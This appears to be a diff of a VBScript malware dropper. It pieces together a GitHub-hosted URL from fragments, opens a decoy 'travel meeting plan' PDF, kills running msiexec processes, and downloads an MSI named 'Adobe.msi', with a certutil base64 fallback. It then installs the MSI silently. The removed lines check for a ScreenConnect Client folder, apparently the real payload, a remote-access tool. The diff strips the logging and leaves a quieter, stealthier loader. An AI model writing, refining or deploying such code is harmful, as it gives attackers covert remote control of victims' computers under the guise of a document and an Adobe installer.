@@ -1,316 +1,108 @@
 Dim fso, sh, temp, wmi, http, stream
 Dim p1, p2, p3, p4, p5
 Dim msiUrl, msiPath, pdfUrl, pdfPath
-Dim logFile, df
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set sh  = CreateObject("WScript.Shell")
 temp = sh.ExpandEnvironmentStrings("%TEMP%")
 
-' ============================================================
-'  URL fragments
-' ============================================================
 p1 = "https://raw.g"
 p2 = "ithubuserco"
 p3 = "ntent.com/rotalbilly5"
 p4 = "-sketch/Dream/"
 p5 = "main/"
 
-' ============================================================
-'  Open log
-' ============================================================
-logFile = temp & "\msi_diag.txt"
-Set df = fso.CreateTextFile(logFile, True)
-df.WriteLine "=== MSI DIAG ==="
-df.WriteLine "time  : " & Now
-df.WriteLine "user  : " & sh.ExpandEnvironmentStrings("%USERNAME%")
-df.WriteLine "temp  : " & temp
-df.WriteLine ""
-
-' ============================================================
-'  WMI init
-' ============================================================
-df.WriteLine "--- WMI INIT ---"
 On Error Resume Next
 Set wmi = GetObject("winmgmts:\\.\root\cimv2")
-If Err.Number <> 0 Then
-    df.WriteLine "wmi err: " & Err.Number & " - " & Err.Description
-    Err.Clear
-Else
-    df.WriteLine "wmi ok"
-End If
 On Error GoTo 0
-df.WriteLine ""
 
-' ============================================================
-'  Kill zombie msiexec
-' ============================================================
-df.WriteLine "--- KILL ZOMBIE MSIEXEC ---"
-Dim msiKill, msiKillEntry, killCount
-killCount = 0
+Dim msiKill, msiKillEntry
 On Error Resume Next
 Set msiKill = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='msiexec.exe'")
-If Err.Number <> 0 Then
-    df.WriteLine "query err: " & Err.Number & " - " & Err.Description
-    Err.Clear
-Else
-    For Each msiKillEntry In msiKill
-        df.WriteLine "found msiexec pid=" & msiKillEntry.ProcessId
-        msiKillEntry.Terminate
-        If Err.Number <> 0 Then
-            df.WriteLine "  term err: " & Err.Number & " - " & Err.Description
-            Err.Clear
-        Else
-            killCount = killCount + 1
-        End If
-    Next
-End If
+For Each msiKillEntry In msiKill
+    msiKillEntry.Terminate
+Next
 On Error GoTo 0
-df.WriteLine "killed: " & killCount
-df.WriteLine ""
 
-' ============================================================
-'  Build URLs
-' ============================================================
 pdfUrl = p1 & p2 & p3 & p4 & p5 & "Travel-Meeting-Plan-Q4-2026.pdf"
 pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
 msiUrl = p1 & p2 & p3 & p4 & p5 & "Adobe.msi"
 msiPath = temp & "\Adobe.msi"
 
-df.WriteLine "--- URLS ---"
-df.WriteLine "pdfUrl : " & pdfUrl
-df.WriteLine "msiUrl : " & msiUrl
-df.WriteLine "msiPath: " & msiPath
-df.WriteLine ""
-
-' ============================================================
-'  Fetch PDF
-' ============================================================
-df.WriteLine "--- FETCH PDF ---"
 On Error Resume Next
 Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
-If Err.Number <> 0 Then
-    df.WriteLine "create err: " & Err.Number & " - " & Err.Description
-    Err.Clear
-End If
-On Error GoTo 0
-
-On Error Resume Next
 http.Open "GET", pdfUrl, False
-If Err.Number <> 0 Then
-    df.WriteLine "open err: " & Err.Number & " - " & Err.Description
-    Err.Clear
-End If
-On Error GoTo 0
-
-On Error Resume Next
 http.Send
-If Err.Number <> 0 Then
-    df.WriteLine "send err: " & Err.Number & " - " & Err.Description
-    Err.Clear
-End If
 On Error GoTo 0
-
-df.WriteLine "status : " & http.Status
-df.WriteLine "body   : " & LenB(http.ResponseBody) & " bytes"
-df.WriteLine ""
 
 If http.Status = 200 Then
-    Dim pdfErr
-    pdfErr = ""
     On Error Resume Next
     Set stream = CreateObject("ADODB.Stream")
     stream.Type = 1
     stream.Open
     stream.Write http.ResponseBody
     stream.SaveToFile pdfPath, 2
-    If Err.Number <> 0 Then
-        pdfErr = Err.Number & " - " & Err.Description
-        Err.Clear
-    End If
     stream.Close
     On Error GoTo 0
-    df.WriteLine "pdf save err: " & pdfErr
     If fso.FileExists(pdfPath) Then
-        df.WriteLine "pdf saved: " & fso.GetFile(pdfPath).Size & " bytes"
         sh.Run "msedge.exe """ & pdfPath & """", 1, False
-        df.WriteLine "pdf opened"
-    Else
-        df.WriteLine "pdf NOT on disk"
     End If
 End If
-df.WriteLine ""
 
-' ============================================================
-'  Fetch MSI
-' ============================================================
-df.WriteLine "--- FETCH MSI ---"
 On Error Resume Next
+If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
 Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
-If Err.Number <> 0 Then
-    df.WriteLine "create err: " & Err.Number & " - " & Err.Description
-    Err.Clear
-End If
-On Error GoTo 0
-
-On Error Resume Next
 http.Open "GET", msiUrl, False
-If Err.Number <> 0 Then
-    df.WriteLine "open err: " & Err.Number & " - " & Err.Description
-    Err.Clear
-End If
-On Error GoTo 0
-
-On Error Resume Next
 http.Send
-If Err.Number <> 0 Then
-    df.WriteLine "send err: " & Err.Number & " - " & Err.Description
-    Err.Clear
-End If
 On Error GoTo 0
 
-df.WriteLine "status : " & http.Status
-df.WriteLine "body   : " & LenB(http.ResponseBody) & " bytes"
-df.WriteLine ""
-
-' ============================================================
-'  Save MSI — try ADODB.Stream, fall back to certutil
-' ============================================================
 If http.Status = 200 Then
-    df.WriteLine "--- SAVE MSI (attempt 1: ADODB.Stream) ---"
+    Dim saved
+    saved = False
 
-    ' delete existing first
-    On Error Resume Next
-    If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
-    On Error GoTo 0
-
-    Dim msiSaveErr
-    msiSaveErr = ""
     On Error Resume Next
     Set stream = CreateObject("ADODB.Stream")
     stream.Type = 1
     stream.Open
     stream.Write http.ResponseBody
     stream.SaveToFile msiPath, 2
-    If Err.Number <> 0 Then
-        msiSaveErr = Err.Number & " - " & Err.Description
-        Err.Clear
-    End If
     stream.Close
     On Error GoTo 0
-    df.WriteLine "save err: " & msiSaveErr
 
     If fso.FileExists(msiPath) Then
-        df.WriteLine "saved: " & fso.GetFile(msiPath).Size & " bytes"
+        saved = True
     Else
-        df.WriteLine "NOT on disk — trying certutil fallback"
-        df.WriteLine ""
-
-        ' ---- fallback: write base64 text, decode via certutil ----
-        df.WriteLine "--- SAVE MSI (attempt 2: base64 + certutil) ---"
-        Dim b64Path, fh
+        Dim b64Path, fh, xmlDoc, binNode, b64Text
         b64Path = temp & "\Adobe.b64"
 
-        ' encode body to base64 in-script
-        Dim b64Text, i, b, chr_, encoded
-        ' use MSXML2.DOMDocument to base64-encode the byte array
-        Dim xmlDoc, binNode
         On Error Resume Next
         Set xmlDoc = CreateObject("MSXML2.DOMDocument")
         Set binNode = xmlDoc.createElement("b")
         binNode.dataType = "bin.base64"
         binNode.nodeTypedValue = http.ResponseBody
         b64Text = binNode.text
-        If Err.Number <> 0 Then
-            df.WriteLine "base64 encode err: " & Err.Number & " - " & Err.Description
-            Err.Clear
-        End If
         On Error GoTo 0
 
         If b64Text <> "" Then
-            df.WriteLine "b64 length: " & Len(b64Text)
             On Error Resume Next
             Set fh = fso.CreateTextFile(b64Path, True)
             fh.Write b64Text
             fh.Close
-            If Err.Number <> 0 Then
-                df.WriteLine "b64 write err: " & Err.Number & " - " & Err.Description
-                Err.Clear
-            End If
             On Error GoTo 0
 
             If fso.FileExists(b64Path) Then
-                df.WriteLine "b64 on disk: " & fso.GetFile(b64Path).Size & " bytes"
-                df.WriteLine "running certutil -decode..."
                 sh.Run "%COMSPEC% /c certutil.exe -decode """ & b64Path & """ """ & msiPath & """", 0, True
-
                 If fso.FileExists(msiPath) Then
-                    df.WriteLine "decoded msi: " & fso.GetFile(msiPath).Size & " bytes"
-                    fso.DeleteFile b64Path, True
-                Else
-                    df.WriteLine "decode FAILED"
+                    saved = True
                 End If
+                On Error Resume Next
+                fso.DeleteFile b64Path, True
+                On Error GoTo 0
             End If
         End If
     End If
-End If
-df.WriteLine ""
 
-' ============================================================
-'  Install
-' ============================================================
-df.WriteLine "--- INSTALL ---"
-If fso.FileExists(msiPath) Then
-    df.WriteLine "launching: " & Chr(34) & msiPath & Chr(34)
-    On Error Resume Next
-    sh.Run Chr(34) & msiPath & Chr(34), 0, False
-    If Err.Number <> 0 Then
-        df.WriteLine "shell run err: " & Err.Number & " - " & Err.Description
-        Err.Clear
-    Else
-        df.WriteLine "shell run returned"
+    If saved Then
+        sh.Run "msiexec.exe /i """ & msiPath & """ /qn /norestart", 0, False
     End If
-    On Error GoTo 0
-
-    df.WriteLine "waiting 15s for msiexec..."
-    sh.Run "%COMSPEC% /c timeout /t 15 /nobreak >nul", 0, True
-
-    Dim msiCheck, msiCheckEntry, msiCount
-    msiCount = 0
-    On Error Resume Next
-    Set msiCheck = wmi.ExecQuery("SELECT ProcessId,CommandLine FROM Win32_Process WHERE Name='msiexec.exe'")
-    If Err.Number = 0 Then
-        For Each msiCheckEntry In msiCheck
-            df.WriteLine "msiexec pid=" & msiCheckEntry.ProcessId
-            df.WriteLine "  cmd: " & msiCheckEntry.CommandLine
-            msiCount = msiCount + 1
-        Next
-    Else
-        df.WriteLine "query err: " & Err.Number & " - " & Err.Description
-        Err.Clear
-    End If
-    On Error GoTo 0
-    df.WriteLine "msiexec count: " & msiCount
-Else
-    df.WriteLine "msi not on disk — skipping install"
 End If
-df.WriteLine ""
-
-' ============================================================
-'  Check install result
-' ============================================================
-df.WriteLine "--- INSTALL CHECK ---"
-If fso.FolderExists("C:\Program Files (x86)\ScreenConnect Client") Then
-    df.WriteLine "found: C:\Program Files (x86)\ScreenConnect Client"
-ElseIf fso.FolderExists("C:\Program Files\ScreenConnect Client") Then
-    df.WriteLine "found: C:\Program Files\ScreenConnect Client"
-Else
-    df.WriteLine "no ScreenConnect folder found"
-End If
-
-df.WriteLine ""
-df.WriteLine "=== END ==="
-df.Close
-
-' open the log automatically
-sh.Run "notepad.exe """ & logFile & """", 1, False
